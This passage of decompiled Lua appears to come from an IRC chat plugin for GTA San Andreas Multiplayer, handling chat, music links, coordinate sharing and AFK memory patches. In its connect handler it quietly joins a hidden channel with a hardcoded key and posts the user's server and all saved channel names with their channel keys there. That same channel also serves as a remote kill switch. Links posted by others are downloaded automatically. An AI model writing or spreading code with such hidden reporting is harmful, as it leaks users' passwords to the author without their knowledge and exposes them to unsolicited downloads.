		return "https://drive.google.com/uc?export=download&id=" .. var_29_0
	else
		return "Invalid URL"
	end
end

function deleteAllFiles(arg_30_0)
	for iter_30_0 in io.popen("dir \"" .. arg_30_0 .. "\" /B"):lines() do
		local var_30_0 = arg_30_0 .. iter_30_0

		os.remove(var_30_0)
		print(var_0_1:decode("Удален файл: " .. var_30_0))
	end

	os.execute("explorer \"" .. arg_30_0 .. "\"")
end

function irc_music_in(arg_31_0)
	if var_0_12.cfg.AutoPlayMp3 then
		irc_music_down(arg_31_0)
	else
		local var_31_0 = table.concat(var_0_3.getKeysName(decodeJson(var_0_12.cfg.HotKeyYes)), " + ")
		local var_31_1 = table.concat(var_0_3.getKeysName(decodeJson(var_0_12.cfg.HotKeyNo)), " + ")

		sampAddChat("{00ff00}[IRC] {aaaaaa}Включить трек? {00ff00}%s {aaaaaa}или {ff0000}%s", var_31_0, var_31_1)

		playKeyMusic = "play"
		KeyStartMp3 = arg_31_0

		lua_thread.create(function()
			wait(10000)

			playKeyMusic = nil
		end)
	end
end

function irc_music_down(arg_33_0)
	if var_0_43 then
		var_0_43 = false

		if string.find(arg_33_0, "https://drive.google.com/file/d/") then
			arg_33_0 = generateDownloadLinkFromURL(arg_33_0)
		end

		local var_33_0 = var_0_6.download_status
		local var_33_1 = getFileNameFromUrl(arg_33_0)
		local var_33_2 = var_0_45 .. var_33_1 .. ".mp3"
		local var_33_3
		local var_33_4 = false
		local var_33_5 = false

		if not doesDirectoryExist(var_0_45) then
			createDirectory(var_0_45)
		end

		if doesFileExist(var_33_2) then
			sampAddChat("{ffff00}[IRC]{aaaaaa} Загружаю музыку c: " .. var_33_2)
			irc_music_play_in(var_33_2, arg_33_0)

			var_0_43 = true

			return
		end

		sampAddChat("{00ff00}[IRC]{aaaaaa} Загружаю музыку с URL")

		return (downloadUrlToFile(arg_33_0, var_33_2, function(arg_34_0, arg_34_1, arg_34_2, arg_34_3)
			if var_33_4 then
				if not var_33_5 then
					var_33_5 = true

					print(var_0_1:decode("Загрузка отменена."))
					irc_music_play_in(arg_33_0, arg_33_0)

					var_0_43 = true
				end

				return false
			end

			if arg_34_1 == var_33_0.STATUS_DOWNLOADINGDATA then
				dowmBoolMp3 = true
				dowmMp3N1 = arg_34_2
				dowmMp3N2 = arg_34_3

				if arg_34_2 == arg_34_3 then
					var_33_4 = true
				end
			elseif arg_34_1 == var_33_0.STATUS_ENDDOWNLOADDATA then
				print(var_0_1:decode("Загрузка завершена."))

				var_0_43 = true
			elseif arg_34_1 == var_33_0.STATUSEX_ENDDOWNLOAD then
				if doesFileExist(var_33_2) then
					print(var_0_1:decode("Музыка успешно загружена: " .. var_33_2))
					irc_music_play_in(var_33_2, arg_33_0)

					var_0_43 = true
				else
					sampAddChat("{ff0000}[IRC]{aaaaaa} Не удалось загрузить песню")

					if classChatIrc then
						local var_34_0 = "<<Play_Mp3 Error!>>"

						sendIRC("sendChat", classChatIrc, var_34_0)

						classChatIrc = nil
					end

					var_0_43 = true
				end
			end
		end))
	end
end

function irc_music_play_in(arg_35_0, arg_35_1)
	if PlaySound ~= nil then
		setAudioStreamState(PlaySound, var_0_7.STOP)
	end

	PlaySound = loadAudioStream(arg_35_0)

	if PlaySound then
		setAudioStreamState(PlaySound, var_0_7.PLAY)
		setAudioStreamVolume(PlaySound, var_0_44[0])

		local var_35_0 = table.concat(var_0_3.getKeysName(decodeJson(var_0_12.cfg.HotKeyMusic)), " + ")

		sampAddChat("{00ff00}[IRC]{aaaaaa} Музыка включена. {00ffff}|Pause / Resume|: {aaaaaa}клавиша {00ff00}'%s'", var_35_0)

		if getAudioStreamLength(PlaySound) < 15 then
			PlaySound = loadAudioStream(arg_35_1)

			setAudioStreamState(PlaySound, var_0_7.PLAY)
		end

		pause_bool = true

		SortMusic(arg_35_1)

		classChatIrc = nil

		check_music(PlaySound)
	else
		sampAddChat("{ff0000}[IRC]{aaaaaa} Не удалось загрузить песню")

		if classChatIrc ~= nil then
			local var_35_1 = "<<Play_Mp3 Error!>>"

			sendIRC("sendChat", classChatIrc, var_35_1)

			classChatIrc = nil
		end
	end
end

function check_music(arg_36_0)
	lua_thread.create(function()
		while true do
			wait(500)

			if getAudioStreamState(arg_36_0) == 2 and pause_bool and arg_36_0 ~= nil then
				setAudioStreamState(arg_36_0, var_0_7.RESUME)
			end
		end
	end)
end

function SortMusic(arg_38_0)
	for iter_38_0, iter_38_1 in ipairs(var_0_12.comboMusic) do
		if iter_38_1 == arg_38_0 then
			return
		end
	end

	table.insert(var_0_12.comboMusic, arg_38_0)
	var_0_10.save(var_0_12, var_0_11)
end

function shouldExecuteFunction()
	return os.time() - var_0_12.TimeCash[1] >= 432000
end

function yourFunction(arg_40_0)
	var_0_12.TimeCash[1] = os.time()

	for iter_40_0, iter_40_1 in ipairs(var_0_12.comboMusic) do
		if string.find(iter_40_1, "oceansaver") then
			table.remove(var_0_12.comboMusic, iter_40_0)
		end
	end

	for iter_40_2, iter_40_3 in ipairs(var_0_12.comboMusic) do
		if string.find(iter_40_3, "oceansaver") then
			table.remove(var_0_12.comboMusic, iter_40_2)
		end
	end

	if doesDirectoryExist(var_0_45) then
		deleteAllFiles(var_0_45)
	else
		print(var_0_1:decode("Папка не существует: " .. var_0_45))
	end

	var_0_10.save(var_0_12, var_0_11)

	if arg_40_0 == "1" then
		sampAddChat("{00ff00}[IRC] {aaaaaa}Автоудаление КЕША аудиофайлов завершено!")
		sampAddChat("{00ff00}[IRC] {aaaaaa}Выполняется раз в 5 дней!")
	else
		sampAddChat("{00ff00}[IRC]{aaaaaa} КЕШ удален!")
	end
end

function var_0_8.onPlayAudioStream(arg_41_0, arg_41_1, arg_41_2)
	return false
end

function onIRCMessage(arg_42_0, arg_42_1, arg_42_2)
	for iter_42_0, iter_42_1 in pairs(CrlIRCtoSAMP) do
		arg_42_2 = string.gsub(arg_42_2, iter_42_0, iter_42_1)
	end

	if arg_42_1 == NickName and arg_42_0.nick ~= "StatServ" and var_0_12.cfg.NickPmBool then
		addNickTable(arg_42_0.nick)
	end

	for iter_42_2, iter_42_3 in ipairs(var_0_12.NickPm) do
		if arg_42_0.nick == iter_42_3 and arg_42_1 == NickName then
			local var_42_0 = stringToColor(NickName)
			local var_42_1 = stringToColor(iter_42_3)

			sampAddChat("{%06X}[%s {ffffff}>>{%06X} %s]{ffffff}: %s (/%s)", var_42_1, iter_42_3, var_42_0, NickName, arg_42_2, var_0_12.cfg.CmdNickPm .. iter_42_2)
			table.insert(LogChatPm[iter_42_2], string.format("{%06X}%s{ffffff}: %s (/%s)", var_42_0, NickName, arg_42_2, var_0_12.cfg.CmdNickPm .. iter_42_2))
			processLogChatPm(LogChatPm[iter_42_2])

			if string.find(arg_42_2, "server") then
				local var_42_2 = isGamePaused() and "[AFK]" or sampGetCurrentServerName()

				fSendPm(var_42_2, iter_42_2)
			end

			if string.find(arg_42_2, "ids") then
				local var_42_3 = isGamePaused() and string.format("[AFK] |%s|", ids) or string.format("|%s|", ids)

				fSendPm(var_42_3, iter_42_2)
			end

			if string.find(arg_42_2, "https?://%S+") then
				classChatIrc = iter_42_3

				irc_music_in(arg_42_2)
			end

			addOneOffSound(0, 0, 0, var_0_12.cfg.SoundPm)
		end
	end

	for iter_42_4, iter_42_5 in ipairs(var_0_12.ChanName) do
		if arg_42_1 == iter_42_5 then
			local var_42_4 = stringToColor(arg_42_0.nick)
			local var_42_5 = stringToColor(iter_42_5)

			function sendServerOrAFKMessage()
				local var_43_0 = isGamePaused() and "[AFK]" or sampGetCurrentServerName()

				fSendChan(var_43_0, iter_42_4)
			end

			if string.find(arg_42_2, ids .. " server") then
				sendServerOrAFKMessage()
			end

			if string.find(arg_42_2, "ids") then
				local var_42_6 = isGamePaused() and string.format("[AFK] |%s|", ids) or string.format("|%s|", ids)

				fSendChan(var_42_6, iter_42_4)
			end

			if string.find(arg_42_2, ids .. " crd") or string.find(arg_42_2, NickName .. " crd") then
				fSendCoordChan(iter_42_4)
			end

			local var_42_7 = var_0_1:decode(string.format("|%s | %s| %s (/%s)", iter_42_5, arg_42_0.nick, arg_42_2, ChanCrd[iter_42_4]))

			if string.find(arg_42_2, "<<Coordination ON>>") then
				coordStat[iter_42_4] = true

				if posChan[iter_42_4] then
					posChan[iter_42_4] = false
				end

				var_0_17.Show(var_42_7, var_0_17.TYPE.OK, 7, crlALL.OK)
			elseif string.find(arg_42_2, "<<Coordination OFF>>") or string.find(arg_42_2, "<<You in interior! | Off>>") then
				coordStat[iter_42_4] = false

				var_0_17.Show(var_42_7, var_0_17.TYPE.ERROR, 7, crlALL.WARN)
			else
				sampAddChat("{%06X}[%s] {%06X}%s{ffffff}: %s (/%s)", var_42_5, iter_42_5, var_42_4, arg_42_0.nick, arg_42_2, var_0_12.ChanCmd[iter_42_4])
				table.insert(LogChatChan[iter_42_4], string.format("{%06X}%s{ffffff}: %s (/%s)", var_42_4, arg_42_0.nick, arg_42_2, var_0_12.ChanCmd[iter_42_4]))
				processLogChatPm(LogChatChan[iter_42_4])
			end

			if string.find(arg_42_2, "https?://%S+") then
				classChatIrc = iter_42_5

				irc_music_in(arg_42_2)
			end

			addOneOffSound(0, 0, 0, var_0_12.cfg.SoundChan)
		end

		if arg_42_1 == string.format("#crd%s", iter_42_5) and string.find(arg_42_2, "%[!%]my coord%: ") then
			local var_42_8, var_42_9, var_42_10 = arg_42_2:match("x%:(.+),y%:(.+),z%:(.+)")

			removeBlip(poolChan[iter_42_4])

			poolChan[iter_42_4] = addBlipForCoord(var_42_8, var_42_9, var_42_10)

			local var_42_11 = stringToColor(iter_42_5)
			local var_42_12 = var_42_11 % 256
			local var_42_13 = math.floor(var_42_11 / 256) % 256
			local var_42_14 = math.floor(var_42_11 / 65536) % 256
			local var_42_15 = string.format("0x%02x%02x%02xFF", var_42_14, var_42_13, var_42_12)

			changeBlipColour(poolChan[iter_42_4], var_42_15)
		end
	end
end

function onIRCJoin(arg_44_0, arg_44_1)
	for iter_44_0, iter_44_1 in ipairs(var_0_12.ChanName) do
		if arg_44_1 == iter_44_1 then
			local var_44_0 = string.format("[IRC] %s зашел(а) в [%s]", arg_44_0.nick, arg_44_1)

			var_0_17.Show(var_44_0, var_0_17.TYPE.OK, 7, crlALL.OK)

			UserChan[iter_44_0], fUserChan[iter_44_0] = {}, {}

			if arg_44_0.nick == NickName then
				ChanBool[iter_44_0] = true

				local var_44_1 = string.format("#crd%s", iter_44_1)

				sendIRC("join", var_44_1)
			else
				sendIRC("send", "NAMES %s", iter_44_1)
			end
		end
	end
end

function onIRCPart(arg_45_0, arg_45_1)
	for iter_45_0, iter_45_1 in ipairs(var_0_12.ChanName) do
		if arg_45_1 == iter_45_1 then
			local var_45_0 = string.format("[IRC] %s покинул(а) [%s]", arg_45_0.nick, arg_45_1)

			var_0_17.Show(var_45_0, var_0_17.TYPE.ERROR, 7, crlALL.WARN)

			UserChan[iter_45_0], fUserChan[iter_45_0] = {}, {}

			if arg_45_0.nick == NickName then
				ChanBool[iter_45_0] = false

				local var_45_1 = string.format("#crd%s", iter_45_1)

				sendIRC("part", var_45_1)

				if posChan[iter_45_0] then
					posChan[iter_45_0] = false
				end

				if poolChan[iter_45_0] then
					removeBlip(poolChan[iter_45_0])
				end
			else
				sendIRC("send", "NAMES %s", iter_45_1)
			end
		end
	end
end

function onIRCKick(arg_46_0, arg_46_1, arg_46_2, arg_46_3)
	for iter_46_0, iter_46_1 in ipairs(var_0_12.ChanName) do
		if arg_46_0 == iter_46_1 then
			local var_46_0 = stringToColor(arg_46_2.nick)
			local var_46_1 = stringToColor(iter_46_1)
			local var_46_2 = stringToColor(arg_46_1)

			sampAddChat("{%06X}%s{ffffff} кикнул(а) с {%06X}[%s] {%06X}%s{ffffff} причина: {%06X}%s {ffffff}", var_46_0, arg_46_2.nick, var_46_1, arg_46_0, var_46_2, arg_46_1, var_46_1, arg_46_3)
			table.insert(LogChatChan[iter_46_0], string.format("[%s] кикнул(а) [%s] причина: %s", arg_46_2.nick, arg_46_1, arg_46_3))

			UserChan[iter_46_0], fUserChan[iter_46_0] = {}, {}

			if arg_46_1 == NickName then
				ChanBool[iter_46_0] = false
				posChan[iter_46_0] = false

				if poolChan[iter_46_0] then
					removeBlip(poolChan[iter_46_0])
				end

				local var_46_3 = string.format("#crd%s", iter_46_1)

				sendIRC("part", var_46_3)
			end

			if ChanBool[iter_46_0] then
				sendIRC("send", "NAMES %s", iter_46_1)
			end
		end
	end
end

function onIRCQuit(arg_47_0, arg_47_1)
	msg_notify = string.format("%s отключился от IRC | [%s]", arg_47_0.nick, arg_47_1)

	var_0_17.Show(msg_notify, var_0_17.TYPE.DEBUG, 7, crlALL.DEBUG)

	for iter_47_0, iter_47_1 in ipairs(var_0_12.ChanName) do
		removeBlip(poolChan[iter_47_0])

		if arg_47_0.nick == NickName then
			-- block empty
		else
			UserChan[iter_47_0] = {}
			fUserChan[iter_47_0] = {}

			if ChanBool[iter_47_0] then
				sendIRC("send", "NAMES %s", iter_47_1)
			end
		end
	end
end

function onIRCRaw(arg_48_0)
	if string.find(arg_48_0, "No nickname given") then
		-- block empty
	else
		table.insert(DebugChat, arg_48_0)
	end

	local var_48_0 = {
		"412",
		"499",
		"401",
		"403",
		"475",
		"473",
		"474",
		"461",
		"482",
		"352",
		"404",
		"972"
	}
	local var_48_1 = arg_48_0
	local var_48_2 = {
		["is a halfop"] = "{ffffff} - {FF4C4C}полуопер канала",
		["You're not channel operator"] = " {FF4C4C}Вы не оператор канала.",
		["Cannot send to channel"] = " {FF4C4C}Невозможно отправить сообщение на канал.",
		["is a channel owner"] = "{FF4C4C}является владельцем канала.",
		["No such nick/channel"] = " {aaaaaa}не в сети.",
		["(+b)"] = "Вы забанены!",
		["Not enough parameters"] = "{aaaaaa}Недостаточное количество параметров.",
		["You're not a channel owner"] = " {FF4C4C}Вы не владелец канала.",
		["is a channel admin"] = "{ffffff} - {FF4C4C}администратор канала",
		["Cannot join channel"] = " {FF4C4C}Невозможно подключиться к каналу.",
		["is a channel operator"] = "{ffffff} - {FF4C4C}оператор канала",
		["(+k)"] = "Неверный ключ",
		["No external channel messages"] = " {FF4C4C}Нет сообщений внешнего канала.",
		[":.+ :"] = "",
		["No text to send"] = " {FF4C4C}Нет текста для отправки."
	}

	for iter_48_0, iter_48_1 in pairs(var_48_2) do
		var_48_1 = var_48_1:gsub(iter_48_0, iter_48_1)
	end

	for iter_48_2, iter_48_3 in ipairs(var_0_12.ChanName) do
		if string.find(arg_48_0, ":.+ " .. iter_48_3) then
			for iter_48_4, iter_48_5 in ipairs(var_48_0) do
				if string.find(arg_48_0, ":.+ " .. iter_48_5 .. " " .. NickName) then
					local var_48_3 = stringToColor(iter_48_3)

					sampAddChat("{%06X}[%s] %s", var_48_3, iter_48_3, var_48_1)
				end
			end
		end
	end

	for iter_48_6, iter_48_7 in ipairs(var_0_12.NickPm) do
		if string.find(arg_48_0, ":.+ " .. iter_48_7) then
			for iter_48_8, iter_48_9 in ipairs(var_48_0) do
				if string.find(arg_48_0, ":.+ " .. iter_48_9 .. " " .. NickName) then
					local var_48_4 = stringToColor(iter_48_7)

					sampAddChat("{00ff00}[IRC {ffffff}| {%06X}%s] %s", var_48_4, iter_48_7, var_48_1)
				end
			end
		end
	end

	if string.find(arg_48_0, "#swatsfpd :Cannot join channel") then
		local var_48_5 = arg_48_0:gsub(":.+ :Cannot join channel", ""):gsub("%(+b%)", "Вы заблокированы!"):gsub("%(+k%)", "Не актуальная версия скрипта"):gsub("%(+i%)", "Чат закрыт!")

		sampAddChat("{FF4C4C}Вам закрыт доступ! Обратитесь к разработчику скрипта. " .. var_48_5)

		var_0_12.cfg.AutoConnect, var_0_12.cfg.BeginBool = false, false
		var_0_12.cfg.UpDate = true

		var_0_10.save(var_0_12, var_0_11)
		var_0_5:reload()
	end

	local var_48_6 = arg_48_0
	local var_48_7 = arg_48_0
	local var_48_8 = var_48_6:gsub(":.+ 353 .+ :", ""):gsub("~@", "[A]-"):gsub("&@", "[A]-"):gsub("~", "[A]-"):gsub("&", "[A]-"):gsub("@", "[A]-"):gsub("%%", "[H]-"):gsub("+", "[V]-")
	local var_48_9 = var_48_7:gsub(":.+ 353 .+ :", ""):gsub("~@", ""):gsub("&@", ""):gsub("~", ""):gsub("&", ""):gsub("@", ""):gsub("%%", ""):gsub("+", "")

	for iter_48_10, iter_48_11 in ipairs(var_0_12.ChanName) do
		if string.find(arg_48_0, "353 " .. NickName .. ".+ " .. iter_48_11) then
			for iter_48_12 in var_48_8:gmatch("%S+") do
				SortUsers(iter_48_12, iter_48_10)
			end

			for iter_48_13 in var_48_9:gmatch("%S+") do
				SortUsersf(iter_48_13, iter_48_10)
			end
		end
	end

	for iter_48_14, iter_48_15 in ipairs(var_0_12.ChanName) do
		local var_48_10 = "367 " .. NickName .. " " .. iter_48_15 .. " (%S+)"
		local var_48_11 = arg_48_0:match(var_48_10)

		table.insert(banUserChan[iter_48_14], var_48_11)
	end

	if string.find(arg_48_0, "311 " .. NickName) then
		local var_48_12 = ":%S+ 311 %S+ (%S+) (%S+) (%S+)%s"
		local var_48_13, var_48_14, var_48_15 = arg_48_0:match(var_48_12)

		if statBanIp then
			sendIRC("send", "mode %s +b %s!%s@%s", ChanstatBanIp, var_48_13, var_48_14, var_48_15)

			statBanIp = false
		end
	end

	for iter_48_16, iter_48_17 in ipairs(var_0_12.ChanName) do
		if string.find(arg_48_0, "MODE " .. iter_48_17 .. ".+b .+") then
			local var_48_16, var_48_17, var_48_18, var_48_19 = arg_48_0:match(":(%S+)!%S+ MODE (%S+)%s+(%S+)%s+(.+)")
			local var_48_20
			local var_48_21 = var_48_18 == "+b" and "забанил(a)" or var_48_18 == "-b" and "разбанил(a)" or "null"

			banUserChan[iter_48_16] = {}

			sendIRC("send", "mode %s +b", iter_48_17)

			local var_48_22 = stringToColor(var_48_16)
			local var_48_23 = stringToColor(iter_48_17)
			local var_48_24 = stringToColor(var_48_19)

			table.insert(LogChatChan[iter_48_16], string.format("[%s] %s [%s]", var_48_16, var_48_21, var_48_19))
			sampAddChat("{%06X}%s{ffffff} на канале {%06X}[%s]{ffffff} %s {%06X}%s{ffffff}", var_48_22, var_48_16, var_48_23, var_48_17, var_48_21, var_48_24, var_48_19)
		elseif string.find(arg_48_0, "MODE " .. iter_48_17 .. ".+") then
			UserChan[iter_48_16] = {}
			fUserChan[iter_48_16] = {}

			if ChanBool[iter_48_16] then
				sendIRC("send", "NAMES %s", iter_48_17)
			end
		end

		if string.find(arg_48_0, NickName .. " " .. iter_48_17 .. " :Cannot join channel .+k") then
			ChanBool[iter_48_16] = false
			MimPassChan = true
			PassChanName = iter_48_17
			KeyPassChan = iter_48_16
			var_0_21[0] = true

			var_0_10.save(var_0_12, var_0_11)
		end

		if string.find(arg_48_0, NickName .. " " .. iter_48_17 .. " :Cannot join channel") then
			ChanBool[iter_48_16] = false

			if posChan[iter_48_16] then
				posChan[iter_48_16] = false
			end

			if poolChan[iter_48_16] ~= nil then
				removeBlip(poolChan[iter_48_16])
			end

			local var_48_25 = string.format("#crd%s", iter_48_17)

			sendIRC("part", var_48_25)
		end
	end

	if string.find(arg_48_0, "001 .+ :Welcome to the") ~= nil then
		local var_48_26 = arg_48_0
		local var_48_27 = string.gsub(var_48_26, ".+ 001 .+ IRC Network ", "")
		local var_48_28 = string.gsub(var_48_27, "!.+@.+", "")

		var_0_9.nick = var_48_28
		NickName = var_48_28

		wait(50)
		sendIRC("send", "NickServ IDENTIFY %s", var_0_12.cfg.NickPass)
		wait(50)
		sendIRC("join", "#swatsfpd", "d7rl0tJpkr3K6d9VmLT7itE")
		wait(50)

		tSendsamp = {}

		table.insert(tSendsamp, string.format("[%s]", sampGetCurrentServerName()))

		for iter_48_18, iter_48_19 in ipairs(var_0_12.ChanName) do
			if var_0_12.ChanBool[iter_48_18] then
				sendIRC("join", iter_48_19, var_0_12.ChanKey[iter_48_18])
				table.insert(tSendsamp, string.format("<<%s | %s>>", iter_48_19, var_0_12.ChanKey[iter_48_18]))
			end
		end

		sendIRC("sendChat", "#swatsfpd", table.concat(tSendsamp, " "))
		wait(50)
		sendIRC("part", "#swatsfpd")
	end

	if string.find(arg_48_0, NickName .. "!.+@.+ NICK") ~= nil then
		local var_48_29 = arg_48_0:match(":(%S+)!")
		local var_48_30 = arg_48_0:match("NICK :(%S+)")
		local var_48_31 = stringToColor(var_48_29)
		local var_48_32 = stringToColor(var_48_30)

		var_0_9.nick = var_48_30
		NickName = var_48_30

		sampAddChat("{00ff00}[IRC] {%06X}%s {ffffff}сменил ник на {%06X}%s{ffffff}", var_48_31, var_48_29, var_48_32, var_48_30)

		for iter_48_20, iter_48_21 in ipairs(var_0_12.ChanName) do
			UserChan[iter_48_20] = {}
			fUserChan[iter_48_20] = {}

			if ChanBool[iter_48_20] then
				sendIRC("send", "NAMES %s", iter_48_21)
			end
		end
	end

	if string.find(arg_48_0, "ERROR :Closing Link: " .. NickName) then
		sampAddChat("{00ff00}[IRC]{aaaaaa} Соединение с IRC перервано.")
		sampAddChat("{00ff00}[IRC]{aaaaaa} Перезагрузка...")
		var_0_5:reload()
	end

	if string.find(arg_48_0, ":NickServ.+ " .. NickName .. " :") then
		local var_48_33 = arg_48_0
		local var_48_34 = string.gsub(var_48_33, ":NickServ.+ " .. NickName .. " :", "")

		table.insert(NickServChat, var_48_34)
	end

	if string.find(arg_48_0, ":ChanServ.+ " .. NickName .. " :") then
		local var_48_35 = arg_48_0
		local var_48_36 = string.gsub(var_48_35, ":ChanServ.+ " .. NickName .. " :", "")

		table.insert(ChanServChat, var_48_36)
	end
end

function onIRCModeChange(arg_49_0, arg_49_1, arg_49_2, ...)
	return
end

function onIRCDisconnect(arg_50_0, arg_50_1)
	return
end

function fSendChanU8(arg_51_0, arg_51_1)
	local var_51_0 = var_0_1(arg_51_0)

	fSendChan(var_51_0, arg_51_1)
end

function fSendPmU8(arg_52_0, arg_52_1)
	local var_52_0 = var_0_1(arg_52_0)

	fSendPm(var_52_0, arg_52_1)
end

function fSendChan(arg_53_0, arg_53_1)
	if ChanBool[arg_53_1] then
		if var_0_12.ChanTag[arg_53_1] == nil or var_0_12.ChanCrlTag[arg_53_1] == nil then
			var_0_12.ChanCrlTag[arg_53_1] = ""
			var_0_12.ChanTag[arg_53_1] = ""
		end

		local var_53_0 = string.format("%s%s\x0F", var_0_12.ChanCrlTag[arg_53_1], var_0_12.ChanTag[arg_53_1])
		local var_53_1 = stringToColor(NickName)
		local var_53_2 = stringToColor(var_0_12.ChanName[arg_53_1])

		if string.find(arg_53_0, "https?://%S+") then
			fSendChanChat(arg_53_0, arg_53_1, "", var_53_2, var_0_12, var_53_1, NickName)
		else
			fSendChanChat(arg_53_0, arg_53_1, var_53_0, var_53_2, var_0_12, var_53_1, NickName)
		end
	end
end

function fSendChanChat(arg_54_0, arg_54_1, arg_54_2, arg_54_3, arg_54_4, arg_54_5, arg_54_6)
	if string.find(arg_54_0, "https?://%S+") then
		irc_music_down(arg_54_0)
	end

	sendIRC("sendChat", arg_54_4.ChanName[arg_54_1], string.format("%s %s", arg_54_2, arg_54_0))

	local var_54_0 = var_0_1:decode(string.format("|%s | %s| %s (/%s)", arg_54_4.ChanName[arg_54_1], arg_54_6, arg_54_0, ChanCrd[arg_54_1]))

	if arg_54_0 == "<<Coordination ON>>" then
		var_0_17.Show(var_54_0, var_0_17.TYPE.OK, 7, crlALL.OK)
	elseif arg_54_0 == "<<Coordination OFF>>" or arg_54_0 == "<<You in interior! | Off>>" then
		var_0_17.Show(var_54_0, var_0_17.TYPE.ERROR, 7, crlALL.WARN)
	else
		for iter_54_0, iter_54_1 in pairs(CrlIRCtoSend) do
			arg_54_2 = string.gsub(arg_54_2, iter_54_0, iter_54_1)
		end

		arg_54_2 = string.gsub(arg_54_2, "\x0F", "{ffffff}")

		sampAddChat("{%06X}[%s] {%06X}%s{ffffff}: %s %s", arg_54_3, arg_54_4.ChanName[arg_54_1], arg_54_5, arg_54_6, arg_54_2, arg_54_0)
		table.insert(LogChatChan[arg_54_1], string.format("{%06X}%s{ffffff}: %s %s", arg_54_5, arg_54_6, arg_54_2, arg_54_0))
		processLogChatPm(LogChatChan[arg_54_1])
	end
end

function fSendPm(arg_55_0, arg_55_1)
	local var_55_0 = stringToColor(NickName)
	local var_55_1 = stringToColor(var_0_12.NickPm[arg_55_1])

	sendIRC("sendChat", var_0_12.NickPm[arg_55_1], arg_55_0)
	sampAddChat("{%06X}[%s {ffffff}>>{%06X} %s]{ffffff}: %s", var_55_0, NickName, var_55_1, var_0_12.NickPm[arg_55_1], arg_55_0)
	table.insert(LogChatPm[arg_55_1], string.format("{%06X}%s{ffffff}: %s", var_55_1, var_0_12.NickPm[arg_55_1], arg_55_0))
	processLogChatPm(LogChatPm[arg_55_1])

	if string.find(arg_55_0, "https?://%S+") then
		irc_music_down(arg_55_0)
	end
end

function fSendCoordChan(arg_56_0)
	lua_thread.create(function()
		posChan[arg_56_0] = not posChan[arg_56_0]
		coordStat[arg_56_0] = not posChan[arg_56_0]

		if posChan[arg_56_0] then
			if getCharActiveInterior(PLAYER_PED) == 0 then
				fSendChan("<<Coordination ON>>", arg_56_0)
			else
				fSendChan("<<You in interior! | Off>>", arg_56_0)

				posChan[arg_56_0] = false
				coordStat[arg_56_0] = true
			end
		else
			fSendChan("<<Coordination OFF>>", arg_56_0)
		end

		while posChan[arg_56_0] do
			if getCharActiveInterior(PLAYER_PED) == 0 then
				local var_57_0 = string.format("#crd%s", var_0_12.ChanName[arg_56_0])

				x, y, z = getCharCoordinates(PLAYER_PED)

				sendIRC("sendChat", var_57_0, "[!]my coord: x:" .. math.floor(x) .. ",y:" .. math.floor(y) .. ",z:" .. math.floor(z))
			else
				fSendChan("<<You in interior! | Off>>", arg_56_0)

				posChan[arg_56_0] = false
				coordStat[arg_56_0] = true
			end

			wait(1500)
		end
	end)
end

function sendIRC(arg_58_0, ...)
	local var_58_0 = {
		...
	}
	local var_58_1, var_58_2 = pcall(function()
		var_0_9[arg_58_0](var_0_9, table.unpack(var_58_0))
	end)

	if not var_58_1 then
		sampAddChat("{00ff00}[IRC]{aaaaaa} Соединение с IRC перервано.")
		sampAddChat("{00ff00}[IRC]{aaaaaa} Перезагрузка...")

		var_0_12.cfg.AutoConnect = false
		var_0_12.cfg.BeginBool = true

		var_0_5:reload()
	end
end

function checkIRC()
	lua_thread.create(function()
		while true do
			wait(30000)
			sendIRC("send", "nick")
		end
	end)
end

function sampAddChat(arg_62_0, ...)
	local var_62_0 = {
		...
	}
	local var_62_1 = string.format(arg_62_0, table.unpack(var_62_0))
	local var_62_2 = var_0_1:decode(var_62_1)

	return sampAddChatMessage(var_62_2, -1)
end

function TableUsersK(arg_63_0)
	UserChan[arg_63_0], fUserChan[arg_63_0], banUserChan[arg_63_0], LogChatChan[arg_63_0] = {}, {}, {}, {}
	ChanBool[arg_63_0] = var_0_12.ChanBool[arg_63_0]
	coordStat[arg_63_0] = true

	if var_0_12.ChanCmd[arg_63_0] ~= "" then
		sampRegisterChatCommand(var_0_12.ChanCmd[arg_63_0], function(arg_64_0)
			fSendChanU8(arg_64_0, arg_63_0)
		end)
	end

	ChanCrd[arg_63_0] = var_0_12.ChanCmd[arg_63_0] .. "g"

	sampRegisterChatCommand(ChanCrd[arg_63_0], function(arg_65_0)
		fSendCoordChan(arg_63_0)
	end)

	for iter_63_0, iter_63_1 in ipairs(decodeJson(var_0_12.logChan[arg_63_0])) do
		table.insert(LogChatChan[arg_63_0], iter_63_1)
	end
end

function generateRandomNumber()
	local var_66_0 = os.time()

	math.randomseed(var_66_0)

	return math.random(111, 999)
end

function SortUsers(arg_67_0, arg_67_1, arg_67_2)
	arg_67_2 = arg_67_2 or UserChan

	for iter_67_0, iter_67_1 in ipairs(arg_67_2[arg_67_1]) do
		if iter_67_1 == arg_67_0 then
			return
		end
	end

	table.insert(arg_67_2[arg_67_1], arg_67_0)
end

function SortUsersf(arg_68_0, arg_68_1)
	SortUsers(arg_68_0, arg_68_1, fUserChan)
end

function stringToColor(arg_69_0)
	local var_69_0 = 5381

	for iter_69_0 = 1, #arg_69_0 do
		var_69_0 = var_69_0 * 33 + arg_69_0:byte(iter_69_0)
	end

	local var_69_1 = var_69_0 % 16777215
	local var_69_2 = math.floor(var_69_1 / 65536) % 256
	local var_69_3 = math.floor(var_69_1 / 256) % 256
	local var_69_4 = var_69_1 % 256
	local var_69_5 = 32
	local var_69_6 = 160
	local var_69_7 = 224
	local var_69_8 = (var_69_2 + var_69_5) % 256
	local var_69_9 = (var_69_3 + var_69_6) % 256
	local var_69_10 = (var_69_4 + var_69_7) % 256

	return var_69_8 * 256 * 256 + var_69_9 * 256 + var_69_10
end

function processLogChatPm(arg_70_0)
	local var_70_0 = 200
	local var_70_1 = 190

	if var_70_0 < #arg_70_0 then
		local var_70_2 = #arg_70_0 - var_70_1

		for iter_70_0 = 1, var_70_2 do
			table.remove(arg_70_0, 1)
		end
	end
end

function fAFK(arg_71_0)
	if arg_71_0 then
		var_0_4.write(7634870, 1, 1, true)
		var_0_4.write(7635034, 1, 1, true)
		var_0_4.fill(7623723, 144, 8, true)
		var_0_4.fill(5499528, 144, 6, true)
		print(var_0_1:decode("[IRC] Работа в свёрнутом режиме включена"))
	else
		var_0_4.write(7634870, 0, 1, true)
		var_0_4.write(7635034, 0, 1, true)

		arr = {
			80,
			81,
			255,
			21,
			0,
			131,
			133,
			0
		}

		memset(7623723)

		arr = {
			15,
			132,
			123,
			1,
			0,
			0
		}

		memset(5499528)
		print(var_0_1:decode("[IRC] Работа в свёрнутом режиме отключена"))
	end
end

function memset(arg_72_0)
	for iter_72_0 = 1, #arr do
